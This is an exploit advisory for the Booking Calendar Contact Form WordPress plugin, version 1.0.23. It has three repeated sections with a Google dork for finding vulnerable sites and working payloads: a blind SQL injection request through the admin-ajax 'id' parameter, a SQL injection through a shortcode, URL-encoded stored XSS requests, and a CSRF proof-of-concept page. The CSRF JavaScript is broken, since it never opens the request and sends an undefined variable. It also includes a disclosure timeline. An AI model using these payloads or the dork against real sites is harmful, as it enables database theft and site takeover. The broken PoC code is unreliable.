# Date: 2016-02-08
# Google Dork: Index of /wp-content/plugins/booking-calendar-contact-form
# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
# Version: 1.0.23
# Tested on: windows 10 + firefox. 
 
==============
 Description
==============
 
Create a booking form with a reservation calendar or a classic contact form, connected to 
a PayPal payment button.
With the **Booking Calendar Contact Form** you can create a **classic contact form** or a 
**booking form with a reservation calendar**, connected to a PayPal payment button. The reservation 
calendar lets the customer select the start (ex: check-in) and end (ex: checkout) dates.
 
The **reservation calendar** is an optional item, so it can be disabled to create a **general 
purpose contact form**.
 
There are two types of bookings available in the calendar configuration: full day bookings or 
partial day bookings. With full day bookings the whole day is blocked / reserved while in partial 
day bookings the start and end dates are partially blocked as used for example in 
**room/hotel bookings**.
 
===================
 Technical details 
===================
 
Booking calendar plugin  is prone to a blind sql injection because fails to sanitize a 
parameter used into a sql statement. 
The function ´dex_bccf_get_option´ uses a variable called ´CP_BCCF_CALENDAR_ID´ which is not sanitized
and is used as value for the ´id´ of sql parameter.
The vulnerable function is called into many other functions, and one of those is ´dex_bccf_calendar_load2´ 
which sets the ´CP_BCCF_CALENDAR_ID´ with the following code:
 
""
$calid = str_replace(TDE_BCCFCAL_PREFIX, "", @$_GET["id"]);
    if (!defined(&#039;CP_BCCF_CALENDAR_ID&#039;) && $calid != &#039;-1&#039;)
        define(&#039;CP_BCCF_CALENDAR_ID&#039;, $calid);
""
 
and then the function ´dex_bccf_get_option´ is called into ´dex_bccf_calendar_load2´ function:
 
"" ...
$option = dex_bccf_get_option(&#039;calendar_overlapped&#039;, DEX_BCCF_DEFAULT_CALENDAR_OVERLAPPED);
   ...
""
 
The ´dex_bccf_calendar_load2´ function is called when we request the next url:
 
http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=dex_bccf_calendar_ajaxevent
&dex_bccf_calendar_load2=list&id=<SQLI commands>
 
A malicious unauthenticated user can exploit the sql injection and obtain all records from database.
 
==================
 Proof of concept
==================
 
&dex_bccf_calendar_load2=list&id=1%20and%20sleep(10)
 
###############################################################################
 
# Date: 2016-02-08
# Google Dork: Index of /wp-content/plugins/booking-calendar-contact-form
# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
# Version: 1.0.23
# Tested on: windows 10 + firefox.
 
==============
 Description
==============
 
Create a booking form with a reservation calendar or a classic contact form, connected to
a PayPal payment button.
With the **Booking Calendar Contact Form** you can create a **classic contact form** or a
**booking form with a reservation calendar**, connected to a PayPal payment button. The reservation
calendar lets the customer select the start (ex: check-in) and end (ex: checkout) dates.
 
The **reservation calendar** is an optional item, so it can be disabled to create a **general
purpose contact form**.
 
There are two types of bookings available in the calendar configuration: full day bookings or
partial day bookings. With full day bookings the whole day is blocked / reserved while in partial
day bookings the start and end dates are partially blocked as used for example in
**room/hotel bookings**.
 
===================
 Technical details
===================
 
Booking calendar plugin  is prone to a blind sql injection in the shortcode function ´dex_bccf_filter_content´
because there is not sanitization when the variable ´DEX_BCCF_CALENDAR_FIXED_ID´ is asigned and then is used
into function ´dex_bccf_get_public_form()´.
 
function dex_bccf_filter_content($atts) {
...
    extract(shortcode_atts(array(
        &#039;calendar&#039; => &#039;&#039;,
        &#039;user&#039; => &#039;&#039;,
                    ), $atts));
    if ($calendar != &#039;&#039;)
        define(&#039;DEX_BCCF_CALENDAR_FIXED_ID&#039;, $calendar);
    ..
 
    return $buffered_contents;
}
 
 
function dex_bccf_get_public_form() {
    global $wpdb;
 
    if (defined(&#039;DEX_CALENDAR_USER&#039;) && DEX_CALENDAR_USER != 0)
        $myrows = $wpdb->get_results("SELECT * FROM " . DEX_BCCF_CONFIG_TABLE_NAME . " WHERE conwer=" . DEX_CALENDAR_USER);
    else if (defined(&#039;DEX_BCCF_CALENDAR_FIXED_ID&#039;))
        $myrows = $wpdb->get_results("SELECT * FROM " . DEX_BCCF_CONFIG_TABLE_NAME . " WHERE id=" . DEX_BCCF_CALENDAR_FIXED_ID);
    else
        $myrows = $wpdb->get_results("SELECT * FROM " . DEX_BCCF_CONFIG_TABLE_NAME);
 ...
 }
 
 
==================
 Proof of concept
==================
 
An editor/author can add a ahortcode with his sql command into a post:
 
 
[CP_BCCF_FORM calendar=-1 or sleep(10)#]
 
###############################################################################
 
# Date: 2016-02-08
# Google Dork: Index of /wp-content/plugins/booking-calendar-contact-form
# Exploit Author: Joaquin Ramirez Martinez [ i0 SEC-LABORATORY ]
# Version: 1.0.23
# Tested on: windows 10 + firefox.
 
==============
 Description
==============
 
Create a booking form with a reservation calendar or a classic contact form, connected to
a PayPal payment button.
With the **Booking Calendar Contact Form** you can create a **classic contact form** or a
**booking form with a reservation calendar**, connected to a PayPal payment button. The reservation
calendar lets the customer select the start (ex: check-in) and end (ex: checkout) dates.
 
The **reservation calendar** is an optional item, so it can be disabled to create a **general
purpose contact form**.
 
There are two types of bookings available in the calendar configuration: full day bookings or
partial day bookings. With full day bookings the whole day is blocked / reserved while in partial
day bookings the start and end dates are partially blocked as used for example in
**room/hotel bookings**.
 
===================
 Technical details
===================
 
vulnerabilities because does not verify if a user that make a request for update the plugin options,
add or delete a ´season price´ and add/delete/update an item to booking list is a privileged user and does not
sanitize the supplied information.
 
An authenticated user can exploit these vulnerabilities.
 
==================
 Proof of concept
==================
 
1) Add a ´season price´ with XSS Payload in parameter ´price´.
 
http://<wp-path>/<ap-path>/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data&dex_bccf=loadseasonprices
&add=1&dex_item=1&price=%3E%22%3Cimg%20src=x%20onerror=alert(/u_r_owned/)%3E%22%3C&dfrom=&dto
 
2) Delete a ´season price´ with specified ´code´
 
http://<wp-host>/<wp-path>/wp-admin/admin-ajax.php?action=dex_bccf_check_posted_data
&dex_bccf=loadseasonprices&delete=1&code=1
 
 
3) Own a calendars if you have an account like ´suscriptor´ role and inject a XSS payload into ´name parameter´:
http://<wp-hots>/<wp-path>/wp-admin/admin.php?page=dex_bccf.php&u=<my user id>&public=1&owner=1&name=<XSS payload>
 
 
4) Update charset of booking calendar tables:
http://<wp-host>/<wp-path>/wp-admin/admin.php?page=dex_bccf.php&ac=st&chs=<my supplied charset>
 
 
5) Delete a booking calendar item if you are logged in as suscriptor:
 
 
6)  Unrestricted update options / stored XSS in some parameters ( PoC html )
 
 
<html>
  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin
 
email_confirmation_to_user,calendar_language,calendar_mode,calendar_pages,currency,cv_text_enter_valid_captcha
 and other parameters are vulnerables to stored XSS
 
url_ok,url_cancel can be used to redirect a user and make fishing attacks
´dex_item´  value is the ´id´ of the calendar.
   -->
<body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.setRequestHeader("Accept-Language", "es-MX,es-ES;q=0.9,es;q=0.7,es-AR;q=0.6,es-CL;q=0.4,en-US;q=0.3,en;q=0.1");
        xhr.withCredentials = true;
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
 
 
==========
 CREDITS
==========
 
Vulnerability discovered by:
    Joaquin Ramirez Martinez [i0 security-lab]
    joaquin.ramirez.mtz.lab[at]gmail[dot]com
    https://www.facebook.com/I0-security-lab-524954460988147/
    https://www.youtube.com/channel/UCe1Ex2Y0wD71I_cet-Wsu7Q
 
 
========
TIMELINE
========
 
2016-02-01 vulnerability discovered
2016-02-05 reported to vendor
2016-02-08 released fixed plugin v1.0.24
2016-02-08 public disclosure

